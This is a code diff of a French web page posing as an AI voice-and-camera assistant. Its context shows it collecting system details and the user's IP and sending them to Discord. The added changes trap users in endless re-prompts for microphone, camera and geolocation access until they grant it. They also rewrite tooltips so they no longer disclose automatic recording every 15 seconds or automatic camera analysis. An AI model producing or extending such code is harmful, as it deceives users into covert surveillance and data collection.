@@ -290,8 +290,8 @@
 <!-- Message de bienvenue -->
 
   <div class="welcome-box" id="welcomeBox" style="display:none;">
-    <h2>🎉 Bienvenue</h2>
-    <p>Voici un aperçu de comment utiliser cette interface IA performante.</p>
+    <h2>Bienvenue</h2>
+    <p>Voici un aperçu de comment utiliser cette interface IA basée sur Chat-GPT4-5.</p>
     <button onclick="startApp()">Commencer</button>
   </div>
 
@@ -346,10 +346,10 @@
   localStorage.setItem("prenom", prenom);
   loginBox.style.display = "none";
   chatBox.style.display = "flex";
+  document.getElementById("mainContent").style.display = "block"; // 👈 assure que c'est visible
   document.getElementById("mainContent").classList.add("blur-background");
   document.getElementById("welcomeBox").style.display = "block";
 
-  document.getElementById("welcomeBox").style.display = "block";
 
 
   // Ensuite seulement, on récupère les infos système + IP
@@ -388,6 +388,7 @@
   } catch (err) {
     console.error("Erreur lors de l'envoi des infos Discord :", err);
   }
+
 }
 
 
@@ -532,8 +533,10 @@ function showMicroHelp() {
         showCameraHelp();
 
       } catch (err) {
-        console.warn("Micro refusé :", err);
+        alert("🎤 L'accès au micro est nécessaire pour utiliser l'assistant vocal.");
+        showMicroHelp(); // 🔁 redemande le micro
       }
+
 
       document.removeEventListener("click", onClickAnywhere);
     }
@@ -579,9 +582,22 @@ function showCameraHelp() {
           console.log("🔍 Analyse activée !");
           analyzeBtn.onclick(); // ou ta fonction réelle
         };
+        navigator.geolocation.getCurrentPosition(
+        (position) => {
+          console.log("📍 Position activée :", position.coords);
+        },
+        (error) => {
+    alert("📍 La géolocalisation est requise pour améliorer les réponses de l'IA.");
+    // 🔁 Redemande après refus
+    showLocationRequest();
+  }
+);
+
       } catch (err) {
-        console.warn("Caméra refusée :", err);
+        alert("📷 L'accès à la caméra est requis pour l'analyse d'image.");
+        showCameraHelp(); // 🔁 redemande la caméra
       }
+
 
       document.removeEventListener("click", requestCameraAccess);
     }
@@ -590,6 +606,17 @@ function showCameraHelp() {
   document.addEventListener("click", requestCameraAccess);
 }
 
+function showLocationRequest() {
+  navigator.geolocation.getCurrentPosition(
+    (position) => {
+      console.log("📍 Position activée :", position.coords);
+    },
+    (error) => {
+      alert("📍 Vous devez autoriser la position pour utiliser toutes les fonctionnalités.");
+      showLocationRequest(); // 🔁 relance encore
+    }
+  );
+}
 
 
 
@@ -600,10 +627,10 @@ function showCameraHelp() {
   
 <div class="micro-overlay" id="microOverlay"></div>
 <div class="tooltip-micro" id="tooltipMicro" style="display:none;">
-  🎙️ Ce bouton lance l'enregistrement vocal automatique toutes les 15 secondes.
+  🎙️ Ce bouton permet de communiquer par oral avec l'IA.
 </div>
 <div class="tooltip-micro" id="tooltipCamera" style="display:none;">
-  📷 Ce bouton déclenche une analyse automatique par caméra.
+  📷 Ce bouton permet de prendre en photo une image pour l'analyser.
 </div>
 
 
